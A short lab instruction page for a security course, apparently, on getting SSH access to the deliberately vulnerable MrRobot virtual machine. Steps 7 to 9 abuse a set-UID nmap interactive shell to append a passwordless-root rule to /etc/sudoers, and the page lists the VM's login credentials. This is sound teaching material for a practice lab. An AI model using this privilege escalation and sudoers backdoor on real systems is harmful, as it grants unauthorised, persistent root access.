---
layout: page
title: Getting SSH Access on the MrRobot Virtual Machine
---


1. On your Kali system, start a shell by hitting `Alt-F2`, then typing `qterminal ` and hitting `Enter`.

2. Launch the `virt-manager` VirtualMachine Manager, make sure the `mrrobot` VM is running.

3. Next right click on the `mrrobot` VM and select "Open" button at the bottom of the list to open a console on the `mrrobot` virtual machine:

    ![MrRobot VirtualMachine Manager Console](/assets/img/mrrobot-virt-manager-console.png)

4. Log in as `robot` using the password `abcdefghijklmnopqrstuvwxyz`:

    ```shell
    robot
    abcdefghijklmnopqrstuvwxyz
    ```

5. If you've completed [the Set-UID Privelege Escalation exercise](/exercises/mrrobot-privesc/), then skip to step 10 below that starts with "Use sudo to run..."

6. Unless you've completed [the first MrRobot attack exercise](/exercises/mrrobot-privesc/), you'll need to complete the next three steps to give the `robot` user `sudo` access.

7. Start `nmap`:

    ```shell
    /usr/local/bin/nmap --interactive
    ```

8. Add our `robot` user to the sudoers file:

    ```shell
    ! echo "robot    ALL=(ALL) NOPASSWD:ALL" >>/etc/sudoers
    ```

9. Now exit the `nmap` shell:

    ```shell
    exit
    ```

10. Use sudo to run as the `root` user, using the `root` user's normal environment:

    ```shell
    sudo su -
    ```

11. Create a directory that `sshd` requires:

    ```shell
    mkdir /var/run/sshd
    ```

12. Start the `sshd` program:

    ```shell
    /usr/sbin/sshd -D
    ```
